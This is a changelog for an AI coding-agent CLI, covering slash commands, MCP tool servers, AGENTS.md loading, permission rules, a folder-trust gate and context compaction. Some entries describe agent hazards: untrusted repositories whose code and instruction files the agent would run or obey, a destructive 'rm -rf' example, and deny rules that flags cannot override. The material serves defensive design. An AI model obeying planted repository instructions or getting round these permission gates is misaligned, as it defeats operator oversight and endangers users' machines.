  verbatim under a skill named after its own directory.

  A refused skill does not take the roster with it. It stays in `/skills` marked
  `⚠` with the parse error, so a file you can see on disk is accounted for, and
  `/skill <name>` declines to activate it rather than injecting nothing.

  If you have a `SKILL.md` whose frontmatter never parsed, you will now be told —
  that is the change, and the skill was not working before either.

## 2.2.0

### Minor Changes

- dec2c7a: New `/init` slash command: writes an `AGENTS.md` describing the current project
  to future agents.

  It works by asking the agent, not by generating a template. The kernel already
  reads the tree and writes files, so `/init` composes an instruction and drives an
  ordinary turn — a CLI-side generator would produce a directory listing with
  headings on it, and would become a second way to inspect a repository that then
  disagreed with the one the model uses.

  The instruction it sends is the substance. It asks for every claim to be verified
  against the tree and for omission over invention, in those words, because an
  `AGENTS.md` full of plausible-looking conventions is worse than no file at all:
  the next agent obeys it.

  It knows what is already there. When project instructions are loaded, `/init`
  names them and asks for proposed edits rather than a rewrite; when there are
  none, it asks for a new file at the repository root. The session already reports
  which instruction files are in force, so nothing is discovered to answer this.

  Without a provider it says so and stops, since there is no agent to ask.

### Patch Changes

- Updated dependencies [b31a41f]
  - @namzu/sdk@15.1.0

## 2.1.1

### Patch Changes

- 48d9d67: Published tarballs no longer contain test files.

  `files: ["dist", "src", ...]` reads as "the build output and the sources" and
  means "everything the compiler emitted and everything in the tree", so every
  compiled test, its declaration, and both source maps shipped to the registry —
  and for the twelve packages that also ship `src`, the raw test sources went with
  them.

  Measured on the versions currently published:

  | package      | files       | of which tests | unpacked           |
  | ------------ | ----------- | -------------- | ------------------ |
  | `@namzu/sdk` | 3879 → 2239 | 1640 (42%)     | 12.73 MB → 6.81 MB |
  | `@namzu/cli` | 462 → 282   | 180 (39%)      | 1.21 MB → 0.73 MB  |

  Nothing you can import changes. Every package restricts `exports` to `"."`, so
  Node refused a deep subpath into those files already — they were weight in the
  tarball and nothing else. Hence `patch`: there is no consumer-visible surface
  here, only less to download.

  The exclusions are at the packaging layer, not the compiler. Adding `exclude`
  to `tsconfig.json` would have kept tests out of `dist` and also dropped them
  from `tsc --noEmit`, silently ending type-checking of the entire test suite —
  trading a packaging defect for a much worse one.

- Updated dependencies [1cc83a5]
- Updated dependencies [48d9d67]
  - @namzu/sdk@15.0.0
  - @namzu/anthropic@3.1.1
  - @namzu/ollama@2.0.1
  - @namzu/openai@1.1.1
  - @namzu/openrouter@2.0.1

## 2.1.0

### Minor Changes

- 8fa51f8: Three new slash commands in the terminal agent: `/cost`, `/permissions` and
  `/agents`.

  - **`/cost`** — tokens and spend for this run, exact rather than the status
    bar's abbreviation. It states that the figure is cumulative spend and not
    context fill, because those are different quantities and reading one as the
    other is a mistake this codebase has already made once.
  - **`/permissions`** — whether an unreviewed tool call is asked about or
    approved automatically, plus the `allow`/`deny` rules from your
    `namzu.config.json`. It also states the precedence, which is the part people
    get wrong in the dangerous direction: a rule decides first, so the bypass flag
    can never reopen what a `deny` closed.
  - **`/agents`** — the delegates this session can dispatch to, or a plain answer
    that there are none.

  Nothing new is computed. Every figure these print was already produced by the
  kernel and thrown away at the edge: usage arrives on the run's own event stream,
  the permission rules were compiled before the session opened, and the delegate
  roster is decided when the subagent runtime is built. They were reaching the
  status bar in abbreviated form, or nowhere at all.

  `AgentSession` gains a readonly `agentIds` field so the roster can be reported
  rather than rebuilt to find out. It is internal — `@namzu/cli`'s library entry
  exports the doctor API, the shell and the config loader, and has never exported
  `AgentSession` — so this is additive for consumers.

## 2.0.0

### Major Changes

- 5bac979: Removed the `namzu providers` command and its five subcommands (`ls`, `add`,
  `remove`, `default`, `path`), along with the `~/.namzu/providers.json` profile
  store behind them.

  **What breaks.** `namzu providers add …` and its siblings no longer exist. If a
  script calls them it will now fail with an unknown-command error instead of
  succeeding.

  **Why this is a fix and not a regression: the profiles were never used.** The
  run path resolves credentials through `discoverProviders`, which reads
  environment variables, the macOS Keychain, and local probe URLs. It never read
  `providers.json` — `readProfiles` and `resolveApiKey` had exactly one importer
  between them, the `providers` command itself. So `providers add` wrote a file,
  printed `added profile "<name>"`, exited 0, and the credential was never
  consulted by a single run. The store's `~/.namzu/providers.json` file is now
  inert; you may delete it.

  The failure was worse than an unused file, because two shipped commands
  disagreed about your credentials: `providers ls` reported a key with
  `source: file` while `namzu doctor` reported no credentials at all, since they
  read different stores.

  **What to do instead.** Set the provider's environment variable — the same one
  you already set for anything else:

  ```bash
  export ANTHROPIC_API_KEY=sk-ant-…    # or OPENAI_API_KEY, OPENROUTER_API_KEY
  ```

  This is what the run path, the TUI picker and `namzu doctor` have always read,
  and they agree with each other. On macOS an Anthropic OAuth credential in the
  login Keychain is also picked up automatically. To see what is detected, use
  `namzu doctor` or `namzu providers-json` — the latter is a different, live
  command that is not affected by this removal.

  **Why removal rather than wiring it up.** The command's own header declared it
  an unfinished milestone: _"Live provider instantiation … is M3 work and not done
  here; M2's job is purely store + retrieve + display."_ That wiring never
  arrived, and finishing it is a feature rather than a fix. The gap was also far
  wider than the credential: `providers add` accepted seven `--type` values while
  the run path can register four (`bedrock`, `http` and `lmstudio` throw
  `provider "<id>" is not wired yet`), and it accepted nine options of which the
  detection model has fields for two. Wiring only the API key would have left a
  command whose success message was still mostly false.

  Nothing documented it — no page under `docs/`, no README — so no documented
  promise is broken by its removal.

## 1.0.1

### Patch Changes

- ee1aa38: Remove references that pointed readers at a directory they can never open.

  Agent working memory in this repository is gitignored, and several published
  artifacts cited paths inside it. None of them resolved for anyone but the
  maintainer, and four cited session folders that no longer exist at all.

  What a consumer sees change:

  - `@namzu/sandbox` raised `Sandbox backend 'x' is not implemented yet. Track
progress in vendor/namzu/docs.local/sessions/ses_004-...` — a runtime error
    instructing the reader to open a path that is not in the package, not in the
    repository, and not on the internet. It now names what does ship instead.
  - `@namzu/computer-use`'s README linked to an adapter-pattern document under a
    directory that does not exist in any checkout. It now links to the two
    published pages that actually carry the adapter contract, the capability
    protocol, and the platform command matrix.
  - `@namzu/cli`'s README linked to a session folder on the code host that
    returns 404, to explain the doctor's protocol/runtime split. The split is now
    explained in the sentence itself.
  - `@namzu/sdk` source comments cited design documents by path. They cite the
    session by name instead, which is what the reference was ever worth.

  No API, type, or behaviour change. The `@namzu/sandbox` message text is the
  only runtime string affected, and nothing asserts on it.

- Updated dependencies [ee1aa38]
  - @namzu/sdk@14.0.7

## 1.0.0

### Major Changes

- 90e1bba: `namzu run` and `namzu run-stream` refuse a folder nobody has trusted

  **This breaks every headless run in a folder you have not opened namzu in.**
  Migration is one of two things, and both are below.

  namzu's trusted-folder store says in its own header that a folder must be
  trusted "before namzu reads, runs commands in, or edits files in" it. That was
  true of the interactive TUI and false of everything else: the trust check had
  exactly one caller. So

  ```bash
  git clone <someone else's repository> && cd <it>
  namzu run "what does this do?"
  ```

  read that repository's files, ran commands in it, and executed its code — with
  tools auto-approved, because a headless run has nobody to ask. Nothing asked
  you whether you trusted it, because there was no way to ask.

  Both one-shots now check first, before a session is constructed and before
  anything in the directory is read.

  **What to do**

  - Run `namzu` in the folder once and accept the trust prompt. That is
    remembered, covers every subfolder, and is a one-time thing per project.
  - Or pass `--trust`, which accepts the folder **for that run only**. It does
    not write anything down — one reflexive use must not change your machine's
    state forever. For CI this is the intended form: it lives in the job
    definition, where a human reviewed it.

  `--yolo` / `--dangerously-skip-permissions` do **not** imply `--trust`, and
  neither does `--permission-mode`. Those say which tool calls may run inside a
  folder; trust says whether the folder may be worked in at all. Letting an
  existing flag satisfy a new gate is a gate satisfied by accident.

  **How a refusal looks**

  `namzu run` prints the folder and both ways forward, and exits **77**
  (sysexits `EX_NOPERM`). Its own code, because a caller has to tell "you have
  not trusted this folder" — fixable by a human decision — from `64` (your
  arguments are wrong) and `1` (the run failed). `namzu run-stream` emits the
  same explanation as an `{"kind":"error"}` event and then `{"kind":"done"}`, and
  also exits 77: it is the one case where that command exits non-zero, because
  its usual "errors are in-band, exit 0" contract is about a run that started and
  failed, which a host may retry, and this is a refusal to start, which retrying
  cannot fix.

  **What this does not do.** It is not a sandbox. It does not protect a folder
  you trusted that later turns hostile — a pull can bring in anything, and trust
  is a statement about a location rather than its current contents. It does not
  constrain anything inside a trusted folder, where your `permissions` rules and
  the safety gate remain the only controls. It raises the floor from "nobody was
  asked" to "somebody decided", which is the part that was missing.

### Minor Changes

- e43bff6: namzu can connect to the tool servers you declare

  The kernel has spoken this protocol for a long time — `MCPClient`,
  `StdioTransport`, `StreamableHttpTransport` and the tool adapter are all
  exported from `@namzu/sdk`. `packages/cli` imported none of them. So the
  capability existed and was unreachable from the product: a namzu user could not
  connect an external tool server at all, whatever the kernel could do.

  Declare them under `mcpServers` in `namzu.config.json`:

  ```json
  {
    "mcpServers": {
      "tickets": { "command": "node", "args": ["./tools/tickets-server.js"] },
      "search": { "url": "https://tools.example.internal/mcp" }
    }
  }
  ```

  Their tools join the roster the agent works with, prefixed with the server's
  name — `mcp_tickets_create` — so two servers offering the same tool do not
  collide and the transcript says where a call went. A `[permissions]` rule can
  name a bridged tool like any other, and the server's own read-only and
  destructive hints are carried through to the gate.

  **A server that does not come up is named, with the reason.** That is the whole
  hazard this carries: an operator declares a server, watches the agent work
  without its tools, and concludes the model is bad at the task. An entry naming
  both a command and a url — or neither — is refused by name rather than guessed
  at. One server failing never takes the working ones with it.

  What happens next differs by who is watching, deliberately. The TUI prints the
  failure and carries on: you are there, you can read it and fix your config, and
  taking the session away would not help you do that. `namzu run` and
  `namzu run-stream` **refuse** — nobody is watching a headless run, and a script
  that quietly does half the job is worse than one that stops. `run` exits `1`;
  `run-stream` emits the reason as an `error` event.

  Each server gets ten seconds to start, hand shake and list its tools. A request
  timeout cannot cover a process that starts and never speaks, and without a
  bound one wedged server keeps namzu from starting at all — no error, no
  failure.

  A local server is a child process, and namzu now shuts its servers down when a
  session ends: when a one-shot finishes, and when switching providers in the TUI
  replaces one session with another. Nothing else in the CLI owned a child
  process, which is why a session had no shutdown path before this.

  Nothing to configure if you declare no servers; the roster is what it was.

### Patch Changes

- bc57137: A workspace its owner closed takes no new conversation from the CLI either

  The kernel gained a workspace-closed gate: an archived `Project` accepts no new
  session, enforced at the SDK's own ingress paths. The CLI's conversation store
  calls `createSession` on the store **directly**, and a store deliberately holds
  no view of workspace status — so the invariant did not reach here, and namzu
  kept attaching work to a workspace somebody had deliberately closed.

  Whether that was real turned on one question: does the CLI ever reach a project
  it did not just create? It does. `openSessions` reads the project id back out
  of `.namzu/cli.json` and creates a new project only when that pointer is
  missing or stale, so every run after the first attaches to a project that
  already existed. A freshly created project is always open, which is why the
  first run in a directory could never have shown this.

  `startConversation` now calls `requireOpenProject` before creating the session,
  and an archived workspace refuses by name.

  The sub-agent runtime calls `createSession` directly too and is deliberately
  **not** gated: its store is an in-memory one built four lines earlier, the
  project two lines earlier, and neither outlives the runtime — so the id can
  never be one an owner has closed. A check that cannot fail teaches the next
  reader only that the checks here are decoration, so that site carries a comment
  naming the condition that would make it real instead.

- Updated dependencies [b4a3fa7]
  - @namzu/sdk@14.0.4

## 0.8.0

### Minor Changes

- 6a38ecf: namzu reads the project's own `AGENTS.md` and follows it

  Until now every word namzu injected into its system prompt was about the user
  and global to the machine — its identity block, `~/.namzu/USER.md` and
  `~/.namzu/MEMORY.md`. Nothing about the repository it was standing in ever
  reached the model. A project that had written down how it wants code written
  got an agent that could not see it, and the only way to tell it was to paste
  the file by hand at the start of every session.

  The working directory's `AGENTS.md` is now loaded, along with the one in every
  directory up to the repository root — the first with a `.git`, which is a file
  in a worktree and a directory in a clone, and both count. They are ordered
  outermost first, so a package-level file has the last word over a
  repository-level one. Sub-agents get them too: a delegated task writes the same
  code in the same repository and is bound by the same rules.

  Nothing to configure and nothing to opt into. If your project has no
  `AGENTS.md`, the prompt is byte-for-byte what it was.

  What you will see change: namzu names the files it loaded — a line under the
  connect banner in the TUI, and the same line on stderr from `namzu run`,
  alongside the provider line. Nothing on stdout moves, so a script that pipes
  the answer is unaffected. `run-stream` loads the files identically but does not
  yet announce them on its event stream.

  A file is read up to 32,000 characters, and when one is cut the agent is told
  so in place, with the number of characters dropped. A truncated policy is never
  presented as a whole one.

  Read off the working directory means read off whatever directory you pointed
  at, including with `namzu run --cwd`. The text is injected after namzu's own
  identity and rules and is labelled as the project speaking, so a file cannot
  redefine the agent or talk it out of what it was told — but treat an
  `AGENTS.md` from a repository you do not trust the way you would treat its
  build script, which namzu will also run.

- 651e028: namzu is told what day it is and which branch it is on

  The kernel tells the model the working directory and the platform. It does not
  tell it the date, and it says nothing about the repository. Both are facts a
  coding agent needs constantly and cannot get right by guessing.

  A model with no clock answers from its training cut-off. It writes that date
  into a changelog entry, into a `last_updated` frontmatter field, into a
  copyright header, and reasons about "the current version" of a dependency from
  a year that has passed. Nothing about the output looks wrong — it is
  confidently, quietly stale. The branch matters for the same reason in a
  different direction: "commit this" means something else on a release branch
  than on a scratch one, and a detached HEAD means a commit goes nowhere
  reachable.

  So every turn now carries a short block: today's local calendar date, and
  whether the working directory is a repository, on which branch, or with a
  detached HEAD. Sub-agents get it too, resolved when the child is built rather
  than captured at startup, so a delegated task does not inherit a stale answer
  from a session that began yesterday.

  Local date, not UTC: your "today" is the one on your wall, and a machine behind
  UTC would otherwise be told it is tomorrow.

  Deliberately absent: anything about uncommitted changes. This block is the
  cached prefix of every request, and a dirty-file count changes whenever the
  agent saves a file — carrying it would re-key that cache on essentially every
  turn to say something `git status` answers on demand. Date and branch change
  rarely enough to be free.

  Nothing to configure. Two `git` calls per turn, each bounded at two seconds;
  a directory that is not a repository, a machine with no `git`, and a call that
  times out all resolve to the block simply not claiming the fact.

## 0.7.6

### Patch Changes

- Updated dependencies [f605059]
- Updated dependencies [589bcfc]
- Updated dependencies [af9c29d]
  - @namzu/sdk@14.0.0
  - @namzu/anthropic@3.1.0
  - @namzu/ollama@2.0.0
  - @namzu/openai@1.1.0
  - @namzu/openrouter@2.0.0

## 0.7.5

### Patch Changes

- Updated dependencies [fbfb061]
- Updated dependencies [5aae875]
- Updated dependencies [9b01a9e]
  - @namzu/sdk@13.0.0
  - @namzu/anthropic@3.1.0
  - @namzu/ollama@2.0.0
  - @namzu/openai@1.1.0
  - @namzu/openrouter@2.0.0

## 0.7.4

### Patch Changes

- Updated dependencies [d126799]
  - @namzu/sdk@12.0.0
  - @namzu/anthropic@3.1.0
  - @namzu/ollama@2.0.0
  - @namzu/openai@1.1.0
  - @namzu/openrouter@2.0.0

## 0.7.3

### Patch Changes

- Updated dependencies [82267e1]
- Updated dependencies [368fa4b]
  - @namzu/sdk@11.0.0
  - @namzu/anthropic@3.1.0
  - @namzu/ollama@2.0.0
  - @namzu/openai@1.1.0
  - @namzu/openrouter@2.0.0

## 0.7.2

### Patch Changes

- Updated dependencies [84660f7]
  - @namzu/sdk@10.0.0
  - @namzu/anthropic@3.1.0
  - @namzu/ollama@2.0.0
  - @namzu/openai@1.1.0
  - @namzu/openrouter@2.0.0

## 0.7.1

### Patch Changes

- d088779: A delegated sub-agent joins its parent's trace, and shows the label it was made to write

  Two fixes to the `Agent` tool.

  **The child run started its own root trace.** `createTask` was called without
  `parentSpan`, so a sub-agent opened a disconnected root and the one structure a
  delegation trace exists to record — which turn dispatched which child — was the
  part that went missing. Anyone reading a trace saw N unrelated roots where there
  was one tree. The kernel already carries the span the whole way (executing
  tool → `createTask` → child run → child iterations); only the first hop was
  dropped. It now passes the executing tool's span, matching the SDK coordinator.

  If no span is in scope the key is omitted rather than sent as `undefined`: a
  top-level run with no parent is correct to start its own root, and inventing a
  parent would be a different wrong answer.

  **`description` was required and never read.** The schema forced the model to
  write a short label on every call, and the transcript then rendered a truncated
  `JSON.stringify` of the raw arguments instead — so a delegation appeared as
  `{"description":"Audit the auth flow","prompt":"Read every fi…` rather than
  `Agent(Audit the auth flow)`.

  We now **read it** rather than dropping the requirement. The model already
  writes a good label, the field costs nothing to keep, and removing it would
  leave delegations with no honest one-line summary at all — the fallback would
  still be the blob. `description` is consulted **last**, after `command`, `path`,
  `file_path`, `pattern` and `query`, so tools that already summarised correctly
  are unaffected; it only speaks for tools that were falling through to JSON. Two
  SDK coordinator tools whose `description` is likewise a user-facing label pick
  up the same improvement.

  Note for anyone verifying the trace fix in a terminal: the CLI registers no
  telemetry provider by default, so spans are no-ops until `@namzu/telemetry` is
  installed and a provider registered. The parenting is correct either way; it
  becomes visible when there is an exporter to see it.

- fff6a69: The context gauge in the status footer reports the context, not the bill

  The `ctx` bar divided **cumulative run spend** by a context window guessed from
  a substring of the model name. Neither term was the thing it claimed.

  Cumulative spend is monotone by design — it exists so a run can never
  under-report a bill — and it grows superlinearly in turn count, because every
  turn re-sends the whole history and counts those prompt tokens again. Ten turns
  over a 50k context accumulate roughly 500k. So the bar **saturated**: a long
  conversation read FULL while the real context might be a fifth of the window,
  and it was most wrong exactly where a user relies on it. People were compacting
  sessions that had room.

  It now reads the figures the kernel already measures and ships on
  `token_usage_updated`: `contextTokens` over `contextWindowTokens`. The
  model-name guess is deleted, so a window is whatever the run actually resolved
  rather than 200k-or-1M.

  Two things a reader of the bar should know:

  - **A `~` before the percentage means the ratio is inferred, not measured.** It
    appears when the kernel estimated the prompt size instead of the provider
    counting it, **and also when the window itself is the assumed default** — an
    exact count over an invented denominator is still a guess, and marking only
    the numerator would repeat the original error one level down.
  - **No bar at all when either term is missing.** Runs that resolve no window
    report no context figures, and a fraction that cannot be grounded is not an
    approximation of anything. The token and cost figures still show; only the
    proportion is withheld.

  Nothing to change on upgrade — no public export moved. The spend figure beside
  the bar is unchanged and still cumulative.

- Updated dependencies [16dc634]
- Updated dependencies [16dc634]
- Updated dependencies [a743c7e]
- Updated dependencies [529b343]
- Updated dependencies [e355049]
- Updated dependencies [16dc634]
  - @namzu/sdk@9.0.0
  - @namzu/anthropic@3.1.0
  - @namzu/ollama@2.0.0
  - @namzu/openai@1.1.0
  - @namzu/openrouter@2.0.0

## 0.7.0

### Minor Changes

- 586bf3f: a compaction says so, instead of discarding context in silence

  Compaction deletes messages irrecoverably at 70% of the context window. The
  kernel measures the loss and puts both outcomes on the wire specifically so a
  host can show it; this one dropped them at `default: return null`, one function
  from the screen. So the first time anyone learned compaction existed was when
  the agent had forgotten something they were relying on — which reads as the
  model being stupid rather than the harness discarding context.

  Everything else fixed recently was _the run quietly not doing what the operator
  said_. This is the same class with the opposite sign: _the run quietly doing
  something they did not ask for_.

  A compaction now appears in the transcript, on stderr for `namzu run`, and as an
  NDJSON event for a host:

  ```
  ⌫ context compacted — 42 messages replaced by 9, ~120k → ~38k tokens
  ```

  **Only what is checkable.** Compaction summarises, so it cannot enumerate what
  was lost — the loss is fidelity, not a set of removable items, and "removed the
  file contents from turns 3-8" is a claim that cannot be substantiated and is
  worse than silence the first time it is subtly wrong. An estimated token count
  says it is estimated, because quoting an estimate as a measurement is that same
  lie in miniature.

  **A compaction that declines says which of three things happened**, because they
  want different responses and "compaction failed" would put the reader back where
  the silence did: a reducer that threw may work next pass and carries its own
  error; a reducer that shed nothing is reporting a fact, not an error, and will
  answer identically every time; a reducer that split a tool call from its result
  is a bug with no user action at all. Every case states that the history is
  unchanged, which the kernel guarantees by installing a reduction whole or not at
  all.

  The notice goes in the transcript rather than a status indicator, because an
  indicator is present while nothing is happening and gone afterwards — someone
  reading back could not tell whether the gap they were looking at was compacted.

- 60874b8: namzu has no daemon, and stops pretending otherwise

  The peer daemon namzu integrated with is deprecated and going away. Everything
  namzu built on top of it goes in this release. Four user-facing surfaces
  disappear, and one of them is not a command:

  - **`namzu tools`** — and its `ls`, `run <name>` and `sync-types` subcommands.
    It inspected and invoked that daemon's tool layer; with the daemon gone there
    is no layer to inspect.
  - **`/agents`** — listed the agent peers the daemon knew about, across your
    terminals and its LAN discovery.
  - **`/msg <peer> <text>`** — sent a message to another peer's inbox.
  - **The inbound channel.** This one had no command, which is exactly why it is
    easy to omit from a list of removals: another agent could put a message in
    namzu's inbox, and a running namzu would surface it, answer it while idle, and
    route the reply back to the sender. That loop is gone. Nothing can send a
    message to a running namzu any more, and a peer that does will get no answer
    rather than an error.

  **If your credential came from that daemon's secrets file, namzu will no longer
  find it.** It was the second source provider discovery scanned, so a key kept
  only there worked with no environment variable set — and the failure now is not
  an error message but an absence: the first-run picker opens as though you have
  no credential at all. Export it instead (`ANTHROPIC_API_KEY`, `OPENAI_API_KEY`,
  `OPENROUTER_API_KEY`, …) and namzu finds it again. The picker's empty state and
  `namzu doctor` both name the sources that are actually scanned now, so the
  answer is available from the command you would reach for when a key stops being
  found.

  **The agent loses that catalog's ~70 deferred tools** — web search, browser
  fetch, sandboxed execution and the rest. namzu runs on the SDK builtins plus its
  memory and task tools. The connect line drops its `(+N on demand)` suffix, which
  had been counting that catalog and nothing else.

  **`namzu serve` keeps its command and changes its answer.** It used to say
  coordination came from that daemon, so there was no separate namzu one — the
  second half of a sentence whose first half no longer exists. It now states the
  other claim outright: namzu has no daemon and no coordination surface, a run is
  an ordinary process, nothing needs to be running first. The command stays
  because someone typing it deserves an answer, and _unknown command_ is a worse
  one.

  **Config:** the `clawtool` section of `~/.namzu/cli.json` (`binary`, `endpoint`,
  `token`, `autoStart`) is gone from `NamzuCliConfig`. It was optional and
  zero-config, so a file that never set it is unaffected; a file that did will
  have the key ignored.

  **No deprecation window, deliberately.** The window exists so working code gets
  a release where it still runs and warns. The warning would have to say _migrate
  to X_, and there is no X — the thing being integrated with is itself deprecated.
  A warning advertising a migration path that does not exist is worse than the
  removal, and would need removing itself one release later.

  **`minor`, not `major`.** The package is pre-1.0 and promises no stability;
  `major` would move it to `1.0.0`, claiming the surface is settled in the same
  release that deletes three commands from it. That is the larger untruth.

- 3ba50ca: a permissions rule you wrote is the one that runs

  A `permissions` table in a config file did nothing. Not in `namzu run`, not in
  `run-stream`, not in the interactive TUI — nowhere, since the table was
  introduced. Three faults in series, each sufficient on its own:

  1. **The loader dropped it.** `sanitize()` copied exactly `format` and `quiet`
     off a parsed config file, so `permissions` never survived being read.
     `compilePermissions(ctx.config.permissions)` had always been compiling
     `undefined`.
  2. **The turn discarded it.** The top-level turn passed a module-level gate
     whose `rules` is a hardcoded empty array, so even a caller handing rules in
     explicitly had them dropped. The helper that folds them in was called on the
     sub-agent path only.
  3. **The TUI never asked for it.** Only `run` and `run-stream` compiled the
     table at all, so interactive sessions had no rules to drop in the first
     place.

  **Nothing looked broken, and that is the worst part.** The gate already falls
  back to asking, and `ask` compiles to no rule — so a discarded `deny` is
  indistinguishable from a config that was honoured. You are prompted, you
  approve, and you never learn your refusal was thrown away. A visible failure
  would have been found in a day.

  **What changes for you:** if you have a `permissions` table, it now applies. A
  `deny` refuses instead of prompting, and an `allow` stops asking. Check yours
  before upgrading — it has never actually run, so this is the first release in
  which it means anything. In an interactive session a `deny` is not even
  offered for approval, which is the point of writing one.

  Adding a field to the config type now fails to compile until the loader is
  taught to read it. The old code ended in `out as NamzuCliConfig`, and that cast
  is precisely what let `permissions` be declared, documented, type-checked and
  ignored; the loader's field list is now derived from the config type instead of
  restated beside it.

  Also documents where the config file lives and what it looks like, which was
  written down nowhere.

  `minor`, not `patch`: a table that was inert becomes active, so a `deny` you
  forgot you wrote can stop a command that used to run. Nothing about the API
  changed, but the behaviour a consumer sees does, and that is what the bump is a
  claim about.

### Patch Changes

- Updated dependencies [a39c2ed]
- Updated dependencies [f6e0594]
- Updated dependencies [9ac8dd4]
- Updated dependencies [3d4315e]
- Updated dependencies [a39c2ed]
- Updated dependencies [9ac8dd4]
- Updated dependencies [9ac8dd4]
- Updated dependencies [9ac8dd4]
- Updated dependencies [9ac8dd4]
- Updated dependencies [9ac8dd4]
- Updated dependencies [9ac8dd4]
- Updated dependencies [585a592]
  - @namzu/sdk@8.0.0
  - @namzu/anthropic@3.1.0
  - @namzu/ollama@2.0.0
  - @namzu/openai@1.1.0
  - @namzu/openrouter@2.0.0

## 0.6.0

### Minor Changes

- 08b915f: `namzu run --continue` and `--resume <id>` reopen a previous conversation

  The store, the reader and the picker all existed — a conversation you could
  reopen inside the TUI with `/resume` could not be reopened from a script,
  because only the entry point was missing.

  `--continue` takes the most recent conversation in the working directory;
  `--resume <id>` takes the one you name.

  **Both refuse when the conversation cannot be reopened, and neither ever falls
  back to starting a new one.** Someone who types `--resume` is asking for _that_
  conversation; silently starting a fresh one hands back something
  indistinguishable from what they asked for, and they find out several turns
  later having already acted on it. Resuming with a partial transcript is worse
  still — a half-context is not a degraded context, it is a different context that
  lies about being complete.

  The refusal names the cause rather than the outcome, because the causes have
  different fixes: "no previous conversation in /path" points at `--cwd`, which is
  usually the real mistake, while an unknown id says how many others are there.

  There is deliberately no way to spell "resume if you can, otherwise start" — run
  with no flag for that.

- 724c8f6: `--permission-mode` decides what happens to the calls no rule covered

  The `[permissions]` table says what a tool may do. This says what happens to
  everything it did not cover: `prompt` asks, `auto` approves, `strict` refuses.

  `strict` is the one that did not exist. An unattended run could only be `auto`,
  so a CI job either trusted the agent with every tool it might reach for or could
  not use it. Under `strict` nothing runs unless a rule allowed it by name or
  pattern, and the refusal tells the model that asking again will not help — so it
  stops rather than rewording.

  `--yolo` and `--dangerously-skip-permissions` now mean `--permission-mode auto`.
  They were accepted and documented as doing nothing, which was true and
  unsatisfying.

  **Precedence, stated once:** a mode only governs calls no rule decided, so it can
  never reopen what a rule closed. `--permission-mode auto` cannot run something
  the config says `deny`, and neither can `--yolo`; the dangerous-pattern floor is
  above both. The config file is written once and reviewed; a flag is typed in a
  hurry. A prohibition a flag can lift is not a prohibition.

- b2d90ad: an operator can say which tools may run without asking

  The kernel has had a permission engine for as long as the gate has existed —
  `VerificationRule[]` with allow/deny/review, seven rule types, evaluated
  first-match-wins. The CLI passed `rules: []`. So the engine ran with nothing in
  it and every mutating call fell through to the same prompt, whether it was
  `git status` or `rm -rf`.

  A `[permissions]` table in the CLI config is now compiled into that array:

  ```toml
  [permissions]
  read = "allow"
  bash = { "git status*" = "allow", "git push*" = "deny", "*" = "ask" }
  ```

  **A tool nobody wrote a rule about is still asked about.** `ask` deliberately
  emits no rule, because the gate's fallback for an unmatched call is already
  `review` — if `ask` emitted something it would have to mean something different
  from silence, and it does not. There is no way to spell "allow by omission":
  widening the default has to be something an operator typed. A newly bridged
  tool that appears tomorrow prompts, exactly as it did before this existed.

  Patterns are ordered most-specific-first at compile time, because the kernel
  stops at the first match — `{ "*" = "ask", "git push*" = "deny" }` would
  otherwise read as a prohibition while being none. A trailing `" *"` also matches
  the bare command, so `git push *` catches `git push`.

  A line that cannot be read is reported and the rest still load. A permission
  someone wrote and which was silently dropped is the worst outcome available
  here: they believe a control is in force and it is not.

- 7c66bf2: `--instance` is removed, because it never did anything

  `run` and `run-stream` parsed `--instance <name>` into a field that nothing in
  the repository read. Its own comment said it chose "which namzu persona
  answers"; no persona selection exists. A host that passed it got the behaviour
  it asked for exactly never, and was told exactly nothing.

  That is worse than an absent flag. An absent flag reports itself the moment you
  use it. A flag that parses and is discarded reports nothing until someone
  notices the behaviour they asked for never happened — which for a persona
  selector could be a long time, or never.

  **What breaks:** `namzu run --instance x "…"` and `namzu run-stream --instance x
"…"` now fail with `unknown option(s): --instance` — exit 64 for `run`, an
  in-band error event for `run-stream`. Remove the flag from the invocation;
  nothing else changes, because nothing else ever depended on it.

  **Why no deprecation window.** SemVer's guidance is to precede a removal with a
  release that warns, so working code has a version where it still compiles. That
  exists to protect code that WORKS. There is no working code to protect here: the
  flag had no producer, no reader and no runtime effect, and the repository's
  release rule says such a declaration may be removed outright provided the
  changeset says so. This one says so.

  It was not wired instead, because wiring it would mean inventing persona
  selection to justify a flag that was already there — which is how dead
  configuration gets written rather than removed.

- 5391d93: `namzu run` takes the options `run-stream` takes, instead of reading them out to the model

  The two headless one-shots are the same command with different output — `run`
  prints the reply for a shell, `run-stream` emits one JSON event per line for a
  host UI — and they accepted different input. `run` parsed nothing at all and
  joined every argument into the prompt, so

  ```
  namzu run --cwd /projects/foo "fix the failing test"
  ```

  sent the model a prompt beginning `--cwd /projects/foo` and ran in this
  directory anyway. That is the defect fixed in `run-stream` one release ago,
  still live in its sibling.

  `run` now accepts `--cwd`, `--provider`, `--model`, `--skills` and `--`, parsed
  by the same function `run-stream` uses, so the two cannot drift again.

  **What breaks.** `run` refuses an option it does not recognise instead of
  treating it as prompt text:

  - `namzu run --temperature 0.5 "hello"` used to run, with `--temperature 0.5` as
    the first three words of the prompt, and exit 0. It now prints
    `unknown option(s): --temperature` and exits **64**.
  - A prompt that genuinely starts with a dash needs `--` in front of it:
    `namzu run -- --force means what?`. A single leading `-` was never an option
    and still is not.

  To keep the old behaviour for a prompt containing flag-shaped text, put `--`
  before it. There is no way to get back the old reading of an unrecognised
  `--flag` as prompt text, and that is the point of the change.

  Classified minor, not major: SemVer §4 puts 0.x outside the stable-API
  guarantee, and this matches how the same narrowing was classified for
  `run-stream`.

  `--yolo` / `--dangerously-skip-permissions` are accepted on both commands and do
  nothing there, which is now stated in `--help` rather than left to be inferred:
  a headless turn has nobody to ask for approval, so it never prompts, so there is
  no prompt to skip. The safety gate that refuses catastrophic shell commands is
  unaffected and cannot be bypassed by either flag.

### Patch Changes

- 5391d93: `namzu run` stops discarding piped input when a prompt is also given

  ```
  cat notes.txt | namzu run "summarise this"
  ```

  sent the model three words. The file was read by nothing: piped input was
  consulted only when there was no prompt argument at all. The run succeeded, exit
  0, and the answer was about nothing — a pipe and a question are the ordinary way
  to ask about a document, and taking only one of the two is the worst available
  reading of that command.

  Piped input is now used in both cases. With no prompt argument it IS the prompt,
  as before. Alongside one it is appended as the material the question is about,
  fenced so the model can tell the request from the content:

  ```
  summarise this

  <stdin>
  …the file…
  </stdin>
  ```

  `namzu run -` reads the prompt from stdin explicitly. Previously `-` was sent to
  the model as a one-character question.

  **On waiting.** Whether anything is being piped in cannot be answered without
